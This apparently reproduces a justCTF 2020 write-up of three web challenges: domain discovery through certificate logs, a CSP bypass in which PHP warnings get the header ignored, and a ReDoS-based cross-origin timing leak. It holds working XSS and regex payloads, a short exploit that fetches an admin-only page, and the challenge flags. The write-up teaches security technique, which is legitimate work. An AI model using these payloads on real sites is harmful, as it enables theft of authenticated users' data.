@@ -1,0 +1,183 @@
+
+https://hackmd.io/@terjanq/justCTF2020-writeups
+
+#######################################################
+########################################################
+
+Write-ups to justCTF [*] 2020 by @terjanq
+Forgotten Name (web/misc, 160 solves, 72 points)
+We forgot what our secret domain name was… We remember that it starts with 6a... Can you help me recover it?
+
+Hint: the domain name is not bruteforcable
+
+The solution
+It was marked as an easy challenge and was mostly about asset discovery.
+
+From the description we can read that the goal is to find a “forgotten” domain name that the challenge could run on. In all other challenges from this and last year one could notice that they are hosted on *.*.jctf.pro if they need access to the outside world. Searching on https://crt.sh/?q=jctf.pro we can notice there is indeed a domain called 6a7573744354467b633372545f6c34616b735f6f3070737d.web.jctf.pro (this probably could be also done with various available domain discovery tools). When we visit the page under that domain we see a simple html page:
+
+OH! You found it! Thank you <3
+Nothing more. The domain name is written in hex, after decoding the hex part we get the flag.
+
+In [1]: '6a7573744354467b633372545f6c34616b735f6f3070737d'.decode('hex')
+Out[1]: 'justCTF{c3rT_l4aks_o0ps}'
+Baby CSP (web, 6 solves, 406 points)
+We just started our bug bounty program. Can you find anything suspicious?
+
+The website is running at https://baby-csp.web.jctf.pro/
+
+The challenge
+The challenge was marked as medium but had very little solves. The idea wasn’t new to the challenge so I thought players would know it but apperantly this wasn’t the case and it was proven that the challenge was rather difficult.
+
+By visiting the main page we could see a higlighted source code of the main server code.
+
+<?php
+require_once("secrets.php");
+$nonce = random_bytes(8);
+
+if(isset($_GET['flag'])){
+ if(isAdmin()){
+    header('X-Content-Type-Options: nosniff');
+    header('X-Frame-Options: DENY');
+    header('Content-type: text/html; charset=UTF-8');
+    echo $flag;
+    die();
+ }
+ else{
+     echo "You are not an admin!";
+     die();
+ }
+}
+
+for($i=0; $i<10; $i++){
+    if(isset($_GET['alg'])){
+        $_nonce = hash($_GET['alg'], $nonce);
+        if($_nonce){
+            $nonce = $_nonce;
+            continue;
+        }
+    }
+    $nonce = md5($nonce);
+}
+
+if(isset($_GET['user']) && strlen($_GET['user']) <= 23) {
+    header("content-security-policy: default-src 'none'; style-src 'nonce-$nonce'; script-src 'nonce-$nonce'");
+    echo <<<EOT
+        <script nonce='$nonce'>
+            setInterval(
+                ()=>user.style.color=Math.random()<0.3?'red':'black'
+            ,100);
+        </script>
+        <center><h1> Hello <span id='user'>{$_GET['user']}</span>!!</h1>
+        <p>Click <a href="?flag">here</a> to get a flag!</p>
+EOT;
+}else{
+    show_source(__FILE__);
+}
+
+// Found a bug? We want to hear from you! /bugbounty.php
+// Check /Dockerfile
+At the bottom we can see two comments:
+
+/Dockerfile which yields a simple Dockerfile of the build:
+FROM php:7.4-apache
+COPY src-docker/ /var/www/html/
+RUN mv "$PHP_INI_DIR/php.ini-development" "$PHP_INI_DIR/php.ini"
+EXPOSE 80
+/bugbounty.php which is basically a script used to report URLs to a bot.
+From the Dockerfile we can notice one thing that will come important later on, and that is php.ini-development which hints us that this is built under the development config.
+
+The solution
+Only three bugs were intended to be present in the code.
+
+Reflected XSS
+We could quickly notice that by visiting https://baby-csp.web.jctf.pro/?user=<u>terjanq</u> we get a reflected HTML returned.
+
+
+
+We are, however, limited to only 23 characters. By visiting https://tinyxss.terjanq.me we can notice a payload with only 23 characters and that is:
+
+<svg/onload=eval(name)>
+This would normally eval the code inside the page, but unforunately this would be blocked by a very strict, nonce-based, CSP (Content-Security-Policy).
+
+
+
+PHP Warnings
+Here comes the second vulnerability in the challenge - PHP running in development mode
+
+We can notice in the code that we can choose which hashing algorithm will be used in order to generate the nonce from 8 random bytes. By providing an invalid algorithm we will see 10 warnings.
+
+
+
+Order matters
+Normally, in PHP, when you return any body data before header() is called, the call will be ignored because the response was already sent to the user and headers must be sent first. In the application there was no explicit data returned before calling header("content-security-policy: ..."); but because warnings were displayed first, they went into the response buffer before the header had a chance to get there in time.
+
+PHP is known for buffering the response to 4096 bytes by default, so by providing enough data inside warnings, the response will be sent before the CSP header, causing the header to be ignored. Hence, it is possible to execute our SVG payload.
+
+There is also another limit for the size of the warning (1kb if I recall correctly) so it is needed to force around 4 warnings 1000 characters each.
+
+Exploit
+<script>
+    name="fetch('?flag').then(e=>e.text()).then(alert)"
+    
+    location = 'https://baby-csp.web.jctf.pro/?user=%3Csvg%20onload=eval(name)%3E&alg='+'a'.repeat('292');
+    
+</script>
+PoC
+
+Some players struggled with fetching the actual flag and this was because the admin was being authenticated through Lax cookie. That’s why it’s needed to use top window instead of iframes for instance. And also, the bot was closing the page just after the page loaded so players had to to either write blocking PoCs or stall the page for a little longer (e.g. through a long loading image).
+
+Computeration (web, 14 solves, 333 points)
+Can you get admin’s note? I heard the website runs >only on client-side so should be secure…
+
+https://computeration.web.jctf.pro/
+
+If you find anything interesting give me call here: https://computeration.web.jctf.pro/report
+
+The flag is in the format: justCTF{[a-z_]+}.
+
+Happy hacking!!
+
+Unintended solution
+It was supposed to be a hard challenge but the original challenge had an unintended (but not unthought of) vulnerability that led to a trivial solution and hence revealign a huge hint towards the intended solution. It was solved by 103 teams. The reason behind the vulnerability was a typo I made in the response headers and which was:
+
+Referrer-policy: no-referer
+Can you spot the typo? I typed no-referer instead of no-referrer which resulted in unsafe-url being set. Because of which, any URL sent through the form would leak the secret endpoint to admin’s “login page” :face_palm:.
+
+
+
+By sending the URL from the referer one can see:
+
+
+
+Indeed, the flag was justCTF{cross_origin_timing_lol}
+
+Intended solution
+The challenge was a simple, static, client-side page that allowed to store some notes in the localstorage.
+
+
+
+ReDoS
+Added notes could be searched through via regular expression:
+
+const reg = new RegExp(decodeURIComponent(location.hash.slice(1)));
+This part of the code triggered when there was onhashchange event triggered.
+Because the attacker can control the location hash of the window/frame and also Regular Expressions are vulnerable to ReDoS attacks, it’s possible to send a malicious expression that will evaluate longer if it matches the secret.
+
+One can find the technique in the amazing blog: A Rough Idea of Blind Regular Expression Injection Attack.
+
+Code execution timing
+When playing another CTF in the past I found a way of measuring the time of code executions of cross-origin documents. This is described in the Busy Event Loop article from the amazing XS-Leaks wiki (xsleaks.dev). Highly recommend reading and contributing!
+
+And the challenge was basically about combining these two presented techniques and developing an exploit.
+
+The exploit
+There was an optimization enabled for the bot that it would close the page when it has loaded. To prevent that, the player had to stall loading the page for longer (it can be for example done with an image that is never loading). When the player did that, the bot would spend around 10 seconds. My script was able to fetch 2-3 characters of the flag per run. It was enough though, with repeating the process multiple times, the player could easily get the flag. I was considering making a challenge that required to leak all the secret at one shot, but I decided not to.
+
+There was also another issue with the bot that once they had been “redossed”, it wasn’t trivial to restore the blocked thread in the event loop. Not sure why, maybe it exhausted all the resources. Instead, I was sending the following payload which didn’t have this issue.
+
+^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$
+It was slowing down the execution of the regular expression in a way that was detectable from a cross-origin page, but wasn’t exploding it exponentially.
+
+I developed a PoC that leaks the flag byte-by-byte.
+
+view-source:https://terjanq.me/justCTF2020/computeration.html will show the commented code of the exploit.
